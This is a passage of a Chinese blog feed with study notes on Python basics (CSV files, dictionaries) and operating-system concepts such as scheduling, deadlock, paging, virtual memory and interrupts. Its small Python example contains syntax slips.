test.txt</span>France,Europe,66.3,211209</code></pre><p>文件的一行称为一条记录(如上)，每条记录包含4个域——国名域，所属大洲域，人口域，国土面积域，每一条记录中的域都是相关的——它们同属于一个国家。</p><h3 id="访问CSV文件中的数据"><a href="#访问CSV文件中的数据" class="headerlink" title="访问CSV文件中的数据"></a>访问CSV文件中的数据</h3><pre class=" language-bash"><code class="language-bash">infile <span class="token operator">=</span> open<span class="token punctuation">(</span>test.txt,<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> infile:    data <span class="token operator">=</span> line.split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#使用split方法获取文件中的域，data为包含四个元素的列表，data[0] = "France" data[3]="211209"</span></code></pre><blockquote><p>注：excel和CSV文件可以互相转换</p></blockquote><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><pre class=" language-bash"><code class="language-bash">def translate<span class="token punctuation">(</span>color<span class="token punctuation">)</span>:    <span class="token keyword">if</span> color <span class="token operator">==</span> <span class="token string">"red"</span><span class="token keyword">:</span>        <span class="token keyword">return</span> <span class="token string">"红色"</span>    <span class="token keyword">elif</span> color<span class="token operator">==</span><span class="token string">"blue"</span>        <span class="token keyword">return</span> <span class="token string">"蓝色"</span>    <span class="token keyword">else</span> color <span class="token operator">==</span> <span class="token string">"white"</span>        <span class="token keyword">return</span> <span class="token string">"白色"</span></code></pre><p>这个函数是一个迷你的中英字典，我们将类似这样的函数称为映射。它将英语单词映射成中文单词。在映射的术语中，单词red/blue/white称为键(key)，中文单词红色、蓝色、白色称为值(value)。</p><p>将python定义为如下形式(字典)，就可以获得和上述函数相同的值。</p><pre class=" language-bash"><code class="language-bash">字典名 <span class="token operator">=</span> <span class="token punctuation">{</span>key:value<span class="token punctuation">}</span>translate <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"red"</span><span class="token keyword">:</span><span class="token string">"红色"</span>,<span class="token string">"blue"</span><span class="token keyword">:</span><span class="token string">"蓝色"</span>,<span class="token string">"white"</span><span class="token keyword">:</span><span class="token string">"白色"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#translate["red"] = "红色"  translate["blue"] = "蓝色" translate["white"] = "白色"</span></code></pre><blockquote><p>注：字典的键必须为不可变对象，因此，列表和集合不可作为键。元素为列表或集合的元组也不能作为键</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统知识点总结(2)</title>
      <link href="/2019/10/04/os2/"/>
      <url>/2019/10/04/os2/</url>
      
        <content type="html"><![CDATA[<h2 id="处理机调度和死锁"><a href="#处理机调度和死锁" class="headerlink" title="处理机调度和死锁"></a>处理机调度和死锁</h2><h3 id="处理机调度的基本概念"><a href="#处理机调度的基本概念" class="headerlink" title="处理机调度的基本概念"></a>处理机调度的基本概念</h3><h4 id="高级、中级和低级调度"><a href="#高级、中级和低级调度" class="headerlink" title="高级、中级和低级调度"></a>高级、中级和低级调度</h4><h5 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h5><p>在每次执行作业调度时，都必须做出以下两个决定：</p><ul><li>接纳多少个作业</li><li>接纳哪些作业</li></ul><h5 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h5><ol><li>非抢占方式</li><li>抢占方式：抢占的原则有：</li></ol><ul><li>优先权原则</li><li>短作业(进程)优先原则</li><li>时间片原则</li></ul><h5 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h5><p>又称中程调度，其目的是为了提供内存利用率和系统吞吐量。为此，应使那些暂时不能运行的进程不再占用宝贵的内存资源，而将它们调至外存上去等待，而此时的进程状态就称为就绪驻外存状态或挂起状态</p><h4 id="调度队列模型"><a href="#调度队列模型" class="headerlink" title="调度队列模型"></a>调度队列模型</h4><h5 id="仅有进程调度的调度队列模型"><a href="#仅有进程调度的调度队列模型" class="headerlink" title="仅有进程调度的调度队列模型"></a>仅有进程调度的调度队列模型</h5><p><img src="https://pic.superbed.cn/item/5df50d3ea4fbc8614a62e1cc.jpg" alt=""></p><h5 id="具有高级和低级调度的调度队列模型"><a href="#具有高级和低级调度的调度队列模型" class="headerlink" title="具有高级和低级调度的调度队列模型"></a>具有高级和低级调度的调度队列模型</h5><p><img src="https://pic2.superbed.cn/item/5df59b19a4fbc8614a7abc83.jpg" alt=""></p><h5 id="具有三级调度的调度队列模型"><a href="#具有三级调度的调度队列模型" class="headerlink" title="具有三级调度的调度队列模型"></a>具有三级调度的调度队列模型</h5><p><img src="https://pic1.superbed.cn/item/5df59d62a4fbc8614a7b1b00.jpg" alt=""></p><h3 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h3><ol><li>先来先服务调度算法</li><li>短作业(进程)优先调度算法：从后备队列中选择一个或若干个估计运行时间最短的作业，将它们调入内存运行</li><li>优先权调度算法：</li></ol><ul><li>非抢占式优先权调度算法：系统一旦把处理机分配给就绪队列中优先权最高的进程后，该进程就一直执行下去，直至完成。</li><li>抢占式优先权调度算法：系统同样把处理机分配给优先权最高的进程，使之执行。但在其执行期间，只要又出现了另一个其优先权更高的进程，进程调度程序就立即停止当前进程的执行，重新将处理机分配给新的优先权最高的进程</li></ul><h4 id="基于时间片的轮转调度算法"><a href="#基于时间片的轮转调度算法" class="headerlink" title="基于时间片的轮转调度算法"></a>基于时间片的轮转调度算法</h4><ol><li>时间片轮转法：系统将所有进程按先来先服务的原则，拍成一个队列，每次调度时，把CPU分配给队首进程，并令其执行一个时间片。当执行的时间片用完时，由一个计数器发出时钟中断请求，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，然后再吧处理机分配给就绪队列中的新的队首进程，同时也让它执行一个时间片。这样就能保证在一定时间内，均能获得一时间片的处理机执行时间。</li><li>多级反馈队列调度算法：设置多个就绪队列，并为各个队列赋予不同的优先级。在优先权愈高的队列中，为每个进程所规定的执行时间片就愈小</li></ol><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>死锁：死锁是指两个或两个以上的线程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去</p><h4 id="产生死锁的原因"><a href="#产生死锁的原因" class="headerlink" title="产生死锁的原因"></a>产生死锁的原因</h4><ul><li>竞争资源</li><li>进程间推进顺序非法</li></ul><h4 id="产生死锁的必要条件"><a href="#产生死锁的必要条件" class="headerlink" title="产生死锁的必要条件"></a>产生死锁的必要条件</h4><ul><li>互斥条件：一个资源一次只能被一个进程使用</li><li>请求和保持条件：一个进程因请求资源而阻塞时，对已获得资源保持不放</li><li>不剥夺条件：进程获得的资源，在未完全使用完之前，不能强行剥夺</li><li>循环等待条件：若干进程之间形成一种头尾相接的环形等待资源关系</li></ul><h5 id="处理死锁的基本方法"><a href="#处理死锁的基本方法" class="headerlink" title="处理死锁的基本方法"></a>处理死锁的基本方法</h5><ul><li>预防死锁</li><li>避免死锁</li><li>检测死锁</li><li>解除死锁</li></ul><h3 id="预防死锁的方法"><a href="#预防死锁的方法" class="headerlink" title="预防死锁的方法"></a>预防死锁的方法</h3><h4 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h4><ul><li>摒弃请求和保持条件</li><li>摒弃不剥夺条件</li><li>摒弃环路等待条件</li></ul><h4 id="系统安全状态"><a href="#系统安全状态" class="headerlink" title="系统安全状态"></a>系统安全状态</h4><p>安全状态，是指系统能按某种进程顺序，来为每个进程分配其所需资源，直至满足每个进程对资源的最大需求，使每个进程都可顺利地完成。如果系统无法找到这样一个安全序列，则称系统处于不安全状态。</p><h2 id="存储器管理"><a href="#存储器管理" class="headerlink" title="存储器管理"></a>存储器管理</h2><h3 id="程序的装入和链接"><a href="#程序的装入和链接" class="headerlink" title="程序的装入和链接"></a>程序的装入和链接</h3><p><img src="https://pic2.superbed.cn/item/5df59ef8a4fbc8614a7b5ccd.jpg" alt=""></p><h4 id="程序的装入"><a href="#程序的装入" class="headerlink" title="程序的装入"></a>程序的装入</h4><ol><li>绝对装入方式：程序中所使用的绝对地址，既可在编译或汇编时给出，也可由程序员直接赋予。但是，一旦程序或数据被修改后，可能要改变程序中的所有地址。因此，通常在程序中采用符号地址，然后在编译或汇编时，再将这些符号地址转换为绝对地址</li><li>可重定位装入方式</li><li>动态运行时装入方式：动态运行时的装入程序，在把装入模块装入内存后，并不立即把装入模块的相对地址转换为绝对地址，而是把这种地址转换推迟到程序真正要执行时才进行。因此，装入内存后的所有地址都仍是相对地址</li></ol><h4 id="程序的链接"><a href="#程序的链接" class="headerlink" title="程序的链接"></a>程序的链接</h4><ol><li>静态链接方式</li><li>装入时动态链接</li><li>运行时动态链接：在执行过程中，当发现一个被调用的模块尚未装入内存时，立即由OS去找到该模块并将之装入内存，把它链接到调用者模块上。凡在执行过程中未被用到的目标模块，都不会被调入内存和被链接到装入模块上。</li></ol><h5 id="动态链接库与静态链接库"><a href="#动态链接库与静态链接库" class="headerlink" title="动态链接库与静态链接库"></a>动态链接库与静态链接库</h5><ul><li>静态链接库是.lib格式的文件，一般在工程的设置界面加入工程中，程序编译时会把lib文件的代码加入你的程序中因此会增加代码大小，你的程序一运行lib代码强制被装入你程序的运行空间，不能手动移除lib代码。</li><li>动态链接库是程序运行时动态装入内存的模块，格式* .dll，在程序运行时可以随意加载和移除，节省内存空间。</li></ul><h3 id="连续分配方式"><a href="#连续分配方式" class="headerlink" title="连续分配方式"></a>连续分配方式</h3><p>分区存储管理的定义：把用户区划分为若干大小不等的分区，供不同程序使用</p><h4 id="单一连续分配"><a href="#单一连续分配" class="headerlink" title="单一连续分配"></a>单一连续分配</h4><p>只能用于单用户、单任务的操作系统中。采用这种存储管理方式时，可把内存分为系统区和用户区两部分，系统区仅提供给OS使用，通常是放在内存的低址部分，用户区是指除系统区以外的全部内存空间，提供给用户使用</p><h4 id="固定分区分配"><a href="#固定分区分配" class="headerlink" title="固定分区分配"></a>固定分区分配</h4><ol><li>划分分区的方法：</li></ol><ul><li>分区大小相等，即使所有的内存分区大小相等</li><li>分区大小不等</li></ul><h4 id="动态分区分配"><a href="#动态分区分配" class="headerlink" title="动态分区分配"></a>动态分区分配</h4><h5 id="分区分配中的数据结构"><a href="#分区分配中的数据结构" class="headerlink" title="分区分配中的数据结构"></a>分区分配中的数据结构</h5><ol><li>空闲分区表</li><li>空闲分区链<br><img src="https://pic3.superbed.cn/item/5df5a091a4fbc8614a7b9fa1.jpg" alt=""></li></ol><h5 id="分区分配算法"><a href="#分区分配算法" class="headerlink" title="分区分配算法"></a>分区分配算法</h5><ul><li>首次适应算法FF</li><li>循环首次适应算法，该算法是由首次适应算法演变而成的</li><li>最佳适应算法</li></ul><h4 id="对换"><a href="#对换" class="headerlink" title="对换"></a>对换</h4><h5 id="对换引入"><a href="#对换引入" class="headerlink" title="对换引入"></a>对换引入</h5><p>对换，是指把内存中暂时不能运行的进程或者暂时不用的程序和数据，调出到外存上，以便腾出足够的内存空间，再把已具备运行条件的进程或进程所需要的程序和数据，调入内存。</p><h5 id="进程的换出与换入"><a href="#进程的换出与换入" class="headerlink" title="进程的换出与换入"></a>进程的换出与换入</h5><ol><li>进程的换出：每当以进程由于子进程而需要更多的内存空间，但又无足够的内存空间等情况发生时，系统应将某进程换出。其过程是：系统首先选择处于阻塞状态且优先级最低的进程作为换出进程，然后启动盘块，将该进程的程序和数据传送到磁盘的对换区上。</li><li>进程的换入：系统定时查看所有进程的状态，从中找出就绪状态已换出的进程，将其中换出时间(换出到磁盘上)最久的进程作为换入进程，将之换入，直至已无可换入的进程或无可换出的进程为止。</li></ol><h3 id="基本分页存储管理方式"><a href="#基本分页存储管理方式" class="headerlink" title="基本分页存储管理方式"></a>基本分页存储管理方式</h3><h4 id="页面与页表"><a href="#页面与页表" class="headerlink" title="页面与页表"></a>页面与页表</h4><h5 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h5><ol><li>页面和物理块：分页存储管理，是将一个进程的逻辑地址空间分为若干个大小相等的页，称为页面或页，并为各页加以编号。相应地，也把内存空间分成与页面相同大小的若干存储块，称为物理块或页框，也同样为它们加以编号。在为进程分配内存时，以块为单位将进程中的若干个页分别装入到多个可以不相邻接的物理块中。由于进程的最后一页经常装不满一块而形成了不可利用的碎片，称之为“页内碎片”</li><li>页面大小：在分页系统中的页面其大小应适中，且页面大小应是2的幂</li></ol><h3 id="基本分段存储管理方式"><a href="#基本分段存储管理方式" class="headerlink" title="基本分段存储管理方式"></a>基本分段存储管理方式</h3><h4 id="利用段表实现地址映射"><a href="#利用段表实现地址映射" class="headerlink" title="利用段表实现地址映射"></a>利用段表实现地址映射</h4><p><img src="https://pic.superbed.cn/item/5df5a1f8a4fbc8614a7bec45.jpg" alt=""></p><h4 id="分段和分页的主要区别"><a href="#分段和分页的主要区别" class="headerlink" title="分段和分页的主要区别"></a>分段和分页的主要区别</h4><ul><li>概念：页是信息的物理单位，段则是信息的逻辑单位，它含有一组其意义相对完整的信息</li><li>目的：分页是为实现离散分配方式，提高内存利用率。分段的目的是为了能更好地满足用户的需要。</li><li>大小、长度：页的大小固定且由系统决定，由系统把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而在系统中只能有一种大小的页面；而段的长度却不固定，决定于用户所编写的程序，通常由编译程序在对源程序进行编译时，根据信息的性质来划分</li><li>地址空间：分页的作业地址空间是一维的，即单一的线性地址空间，程序员只需利用一个记忆符，即可表示一个地址；而分段的作业空间是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址</li></ul><h4 id="段页式存储管理方式"><a href="#段页式存储管理方式" class="headerlink" title="段页式存储管理方式"></a>段页式存储管理方式</h4><h5 id="利用段表和页表实现地址映射"><a href="#利用段表和页表实现地址映射" class="headerlink" title="利用段表和页表实现地址映射"></a>利用段表和页表实现地址映射</h5><p><img src="https://pic.superbed.cn/item/5df5ba0fa4fbc8614a801bc4.jpg" alt=""></p><h3 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h3><h4 id="虚拟存储器的定义"><a href="#虚拟存储器的定义" class="headerlink" title="虚拟存储器的定义"></a>虚拟存储器的定义</h4><ul><li>虚拟存储器，是指具有请求调入功能和置换功能，能从逻辑上对内存容量加以扩充的一种存储器系统。其逻辑容量由内存容量和外存容量之和决定，其运行速度接近于内存速度，而每位的成本接近于外存。</li><li>基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存,然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入内存的信息。这样，系统好像为用户提供了一个比实际内存大得多的存储器，称为虚拟存储器。</li></ul><h4 id="虚拟存储器的实现方法"><a href="#虚拟存储器的实现方法" class="headerlink" title="虚拟存储器的实现方法"></a>虚拟存储器的实现方法</h4><ul><li>请求分页存储管理。</li><li>请求分段存储管理。</li><li>请求段页式存储管理。</li></ul><h4 id="虚拟存储器的特征"><a href="#虚拟存储器的特征" class="headerlink" title="虚拟存储器的特征"></a>虚拟存储器的特征</h4><ul><li>多次性</li><li>对换性</li><li>虚拟性</li></ul><h3 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h3><ol><li>最佳置换算法：所选择的淘汰页面是以后永不使用的</li><li>先进先出算法(FIFO)</li><li>最近最久未使用置换算法(LRU)</li></ol><h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><h3 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h3><h4 id="I-O设备的类型"><a href="#I-O设备的类型" class="headerlink" title="I/O设备的类型"></a>I/O设备的类型</h4><ol><li>按传输速率分类：低速设备、中速设备、高速设备</li><li>按信息交换的单位分类：块设备、字符设备</li><li>按设备的共享属性分类：独占设备、共享设备、虚拟设备</li></ol><h4 id="I-O多路复用"><a href="#I-O多路复用" class="headerlink" title="I/O多路复用"></a>I/O多路复用</h4><p>IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备读取，它就通知该进程</p><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>中断就是在计算机执行程序的过程中，由于出现了某些特殊事情，使得CPU暂停对程序的执行，转而去执行处理这一事件的程序。等这些特殊事情处理完之后再回去执行之前的程序</p><h3 id="中断分类"><a href="#中断分类" class="headerlink" title="中断分类"></a>中断分类</h3><ul><li>内部异常中断：计算机硬件异常或故障引起的中断</li><li>软中断：程序中执行了引起中断的指令而造成的中断</li><li>外部中断：由外部设备请求引起的中断</li></ul><h3 id="中断优先级"><a href="#中断优先级" class="headerlink" title="中断优先级"></a>中断优先级</h3><p>机器错误 &gt; 时钟 &gt; 磁盘 &gt; 网络设备 &gt; 终端 &gt; 软件中断 </p>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统知识点总结(1)</title>
      <link href="/2019/10/02/os1/"/>
      <url>/2019/10/02/os1/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统的目标和作用"><a href="#操作系统的目标和作用" class="headerlink" title="操作系统的目标和作用"></a>操作系统的目标和作用</h2><h3 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h3><ol><li>OS(操作系统，Operation System，OS)作为用户和计算机硬件系统之间的接口：OS处于用户和计算机硬件系统之间，用户通过OS来使用计算机系统。OS是一个系统软件，因此这种接口是软件接口<br><img src="https://pic3.superbed.cn/item/5df4d34da4fbc8614a569375.jpg" alt=""></li></ol><p>用户操纵计算机系统的方式：</p><ul><li>命令方式：指由OS提供了一组联机命令(语言)，用户可通过键盘输入有关命令来直接操纵计算机系统</li><li>系统调用方式：用户可在自己的应用程序中通过相应的系统调用，来操纵计算机</li><li>图形、窗口方式：用户通过屏幕的图形化界面操纵操作系统</li></ul><ol start="2"><li><p>OS是计算机系统资源的管理着<br>计算机系统的资源可分为四类：处理器、存储器、I/O设备以及信息(数据和程序)，OS的主要功能是对这四类资源进行有效管理</p></li><li><p>OS用作扩充机器</p></li></ol><h3 id="操作系统的发展"><a href="#操作系统的发展" class="headerlink" title="操作系统的发展"></a>操作系统的发展</h3><h4 id="无操作系统的计算机系统"><a href="#无操作系统的计算机系统" class="headerlink" title="无操作系统的计算机系统"></a>无操作系统的计算机系统</h4><ol><li>人工操作方式</li><li>脱机输入/输出方式</li></ol><h4 id="单道批处理系统"><a href="#单道批处理系统" class="headerlink" title="单道批处理系统"></a>单道批处理系统</h4><p>单道批处理系统的处理过程：<br><img src="https://pic2.superbed.cn/item/5df4ed7ea4fbc8614a5bbfaf.jpg" alt=""><br>该系统的主要特征：自动性、顺序性、单道性</p><h4 id="多道批处理系统"><a href="#多道批处理系统" class="headerlink" title="多道批处理系统"></a>多道批处理系统</h4><p>在多道批处理系统中，用户所提交的作业都先存放在外存上并排成一个队列，称为”后备队列”，然后，由作业调度程序按一定的算法从后备队列中选择若干个作业调入内存，使它们共享CPU和系统中的各种资源。它的优点有：</p><ul><li>提高CPU的利用率</li><li>提高内存和I/O设备利用率</li><li>增加系统吞吐量<br>多道批处理系统的特征：多道性、无序性、调度性</li></ul><blockquote><p>注：作业是计算机操作者交给操作系统的执行单位(包括程序、相应的数据和作业说明书)</p></blockquote><h4 id="分时系统"><a href="#分时系统" class="headerlink" title="分时系统"></a>分时系统</h4><p>分时(Time-Sharing):多个用户分享同一台计算机<br>分时操作系统将CPU的时间划分成若干个片段，称为时间片。操作系统以时间片为单位，轮流为每个终端用户服务。</p><h4 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h4><p>实时(Real-Time)：表示即时<br>实时系统是指系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致运行。</p><h5 id="实时任务"><a href="#实时任务" class="headerlink" title="实时任务"></a>实时任务</h5><ol><li>按任务执行时是否呈现周期性来划分</li></ol><ul><li>周期性实时任务</li><li>非周期性实时任务</li></ul><ol start="2"><li>根据对截止时间的要求来划分：</li></ol><ul><li>硬实时任务：系统必须满足任务对截止时间的要求，否则可能出现难以预测的结果</li><li>软实时任务：它联系着一个截止时间，但并不严格，若偶尔错过了任务的截止时间，对系统产生的影响也不大。</li></ul><h3 id="操作系统的基本特性"><a href="#操作系统的基本特性" class="headerlink" title="操作系统的基本特性"></a>操作系统的基本特性</h3><h4 id="并发-Concurrence"><a href="#并发-Concurrence" class="headerlink" title="并发(Concurrence)"></a>并发(Concurrence)</h4><ul><li>并行性：两个或多个事件在同一时刻发生</li><li>并发性：两个或多个事件在同一时间间隔内发生<br>在多道程序环境下，并发性是指在一段时间内，宏观上有多个程序在同时运行，但在单处理机系统中，每一时刻却仅能有一道程序执行。故微观上这些程序只能是分时地交替执行。倘若计算机系统有多个处理机，这些并发执行的程序便可被分配到多个处理机上，实现并行执行，即利用每个处理机来处理一个可并发执行的程序。</li></ul><h4 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h4><p>在OS中，共享是指系统中的资源可供内存中多个并发执行的进程(线程)共同使用。主要有两种资源共享方式：</p><ul><li>互斥共享方式：仅当A进程访问完并释放该资源后，才允许另一进程对该资源进行访问。</li><li>同时访问方式：“同时”往往是宏观上的，在微观上，这些进程可能是交替地对该资源进行访问。</li></ul><h4 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h4><p>OS的虚拟，是指通过某种技术把一个物理实体变为若干个逻辑上的对应物。OS中利用了多种虚拟技术，分别用来实现虚拟处理机、虚拟内存、虚拟外部设备和虚拟信道等</p><h4 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h4><p>OS的异步性是指进程以人们不可预知的速度向前推进。</p><h3 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h3><h4 id="处理机管理功能"><a href="#处理机管理功能" class="headerlink" title="处理机管理功能"></a>处理机管理功能</h4><h5 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h5><p>在传统的多道程序环境下，要使作业运行，必须先为它创建一个或几个进程，并为之分配必要的资源。当进程结束时，立即撤销该进程，以便能及时回收该进程所占用的各类资源。进程控制的主要功能是：</p><ul><li>为作业创建进程</li><li>撤销已结束的进程</li><li>控制进程在运行过程中的状态转换</li><li>为一个进程创建若干个线程、撤销已完成任务的线程的功能</li></ul><h5 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h5><p>进程同步的主要任务是为多个进程(含线程)的运行进行协调。有两种协调方式：</p><ul><li>进程互斥方式：指进程(线程)在对临界资源进行访问时，应采用互斥方式</li><li>进程同步方式：指在互相合作区完成共同任务的进程(线程)间，由同步机构对它们的执行次序加以协调</li></ul><p>最简单的用于实现进程互斥的机制，是为每一个临界资源配置一把锁W，当锁打开时，进程(线程)可以对该临界资源进行访问，当锁关上时，则禁止进程(线程)访问该临界资源。</p><h5 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h5><p>当互相合作的进程(线程)处于同一计算机系统时，通常采用直接通信方式，即由源进程利用发送命令直接将消息挂到目标进程的消息队列上，以后由目标进程利用接收命令从其消息队列中取出消息。</p><blockquote><p>临界资源：是指一次只能被一个进程所占用的资源</p></blockquote><h5 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h5><p>在后备队列上等待的每个作业，通常都要经过调度才能执行。在传统OS上，包括作业调度和进程调度两步。</p><ul><li>作业调度：从后备队列中按照一定的算法，选择出若干个作业，为它们分配其必需的资源(首先是分配内存)。在将它们调入内存后，便分别为它们建立进程，使它们都成为可能获得处理机的就绪进程，并按照一定的算法将它们插入就绪队列</li><li>进程调度：从进程的就绪队列中选出一个新进程，把处理机分配给它，并为它设置运行现场，使进程投入执行。</li></ul><blockquote><p>注：在多线程OS中，通常把线程作为独立运行和分配处理机的基本单位。为此，须把就绪线程排成一个队列，每次调度时，是从就绪线程队列中选出一个线程，把处理机分配给它</p></blockquote><h4 id="存储器管理功能"><a href="#存储器管理功能" class="headerlink" title="存储器管理功能"></a>存储器管理功能</h4><h5 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h5><p>OS在实现内存分配时，可采取静态和动态两种方式：</p><ul><li>在静态分配方式中，每个作业的内存空间是在作业装入时确定的，在作业装入后的整个运行期间，不允许该作业再申请新的内存空间，也不允许作业在内存中”移动”</li><li>在动态分配方式中，每个作业所要求的基本内存空间，也是在装入时确定的，但允许作业在运行过程中，继续申请新的附加内存空间，以适应程序和数据的动态增涨，也允许作业在内存中移动</li></ul><p>为了实现内存分配，在内存分配的机制中应具有这样的结构和功能：</p><ul><li>内存分配数据结构，该结构用于记录内存空间的使用情况，作为内存分配的依据</li><li>内存分配功能，系统按照一定的内存分配算法，为用户程序分配内存空间</li><li>内存回收功能，系统对于用户不再需要的内存，通过用户的释放请求，去完成系统的回收功能</li></ul><h5 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h5><p>内存保护的主要任务，是确保每道用户程序都只在自己的内存空间运行，彼此互不干扰。</p><p>内存保护机制：设置两个界限寄存器，分别存放在正在执行程序的上界和下界。系统必须对每条指令所要访问的地址进行检查，如果发生越界，便会发出越界中断请求，停止该程序的运行。(越界检查都由硬件实现，对越界后的处理，还须与软件配合实现)</p><h5 id="地址映射"><a href="#地址映射" class="headerlink" title="地址映射"></a>地址映射</h5><p>一个应用程序(源程序)经编译后，通过会形成若干个目标程序，这些目标程序再经过链接便形成了可装入程序。这些程序的地址都是从0开始的，程序中的其他地址都是相对于起始地址计算的，由这些地址所形成的地址范围成为“地址空间”，其中的地址称为“逻辑地址”或“相对地址”。此外，由内存中的一系列单元所限定的地址称为“内存空间”，其中的地址称为“物理地址”。</p><p>在多道程序环境下，每道程序不可能从‘0’地址开始装入内存，这就导致地址地址空间内的逻辑地址和内存空间中的物理地址不一致。为使程序能正确运行，存储器必须提供地址映射功能，以将地址空间中的逻辑地址转换为内存空间中对应的物理地址。</p><h5 id="内存扩充"><a href="#内存扩充" class="headerlink" title="内存扩充"></a>内存扩充</h5><p>存储器管理中的内存扩充任务，并非是去扩大物理内存的容量，而是借助于虚拟存储技术，从逻辑上去扩充内存容量。使用户所感觉到的内存容量比实际内存容量大得多。为了能在逻辑上扩充内存，系统必须具有内存扩充机制，用于实现下述功能：</p><ul><li>请求调入功能</li><li>置换功能</li></ul><h4 id="设备管理功能"><a href="#设备管理功能" class="headerlink" title="设备管理功能"></a>设备管理功能</h4><p>设备管理用于管理计算机系统中所有的外围设备，设备管理的主要任务是：</p><ul><li>完成用户进程提出的I/O请求，为用户进程分配其所需的I/O设备，提高CPU和I/O设备的利用率，提高I/O速度，方便用户使用I/O设备<br>为实现上述任务，设备管理应具有缓冲管理、设备分配和设备处理以及虚拟设备等功能</li></ul><h5 id="缓冲管理"><a href="#缓冲管理" class="headerlink" title="缓冲管理"></a>缓冲管理</h5><p>CUP运行的高速性和I/O低速性间的矛盾。为了有效缓解这种矛盾，在I/O设备和CPU之间引入缓冲。</p><p>最常见的缓冲区机制有单缓冲机制、能实现双向同时传送数据的双缓冲机制，以及能供多个设备同时使用的公用缓冲池机制。</p><h5 id="设备分配"><a href="#设备分配" class="headerlink" title="设备分配"></a>设备分配</h5><p>设备分配的基本任务，是根据用户进程的I/O请求、系统的现有资源情况以及按照某种设备分配策略，为之分配其所需的设备。</p><h5 id="设备处理"><a href="#设备处理" class="headerlink" title="设备处理"></a>设备处理</h5><p>设备处理程序又称为设备驱动程序。其基本任务是用于实现CPU和设备控制器之间的通信，即由CPU向设备控制器发出I/O命令，要求它完成指定的I/O操作</p><h4 id="文件管理功能"><a href="#文件管理功能" class="headerlink" title="文件管理功能"></a>文件管理功能</h4><h5 id="文件存储空间的管理"><a href="#文件存储空间的管理" class="headerlink" title="文件存储空间的管理"></a>文件存储空间的管理</h5><p>由文件系统对诸多文件及文件的存储空间，实施统一的管理。其主要任务是为每个文件分配必要的外存空间，提高外存的利用率，并有助于提高文件系统的运行速度。</p><h5 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h5><p>为了使用户能方便地在外存上找到自己所需的文件，通常由系统为每个文件建立一个目录项。由若凡个目录项又可以构成一个目录文件。目录管理的主要任务。是为每个文件创立其目录项，并对目录项加以有效的组织，以实现方便的按名存取。<br>其次，目录管理还应能实现文件共享，这样，只需在外存上保留一份该共享文件的副本。</p><h5 id="文件的读-写管理和保护"><a href="#文件的读-写管理和保护" class="headerlink" title="文件的读/写管理和保护"></a>文件的读/写管理和保护</h5><ul><li>文件的读/写管理：该功能是根据用户的请求，从外存中读取数据；或将数据写入外存。在进行文件读写时。系统现根据用户给出的文件名，去检索文件目录。从中获得文件在外存中的位置。然后，利用文件读写指针，对文件进行读写。一旦读写完成，便修改读写指针，为下一次读写做好准备。由于读写操作不会同时进行，故可合用一个读写指针。</li><li>文件保护：防止未经批准的用户存取文件，防止冒名顶替存取文件，防止以不正确的方式使用文件</li></ul><h4 id="用户接口"><a href="#用户接口" class="headerlink" title="用户接口"></a>用户接口</h4><h5 id="命令接口"><a href="#命令接口" class="headerlink" 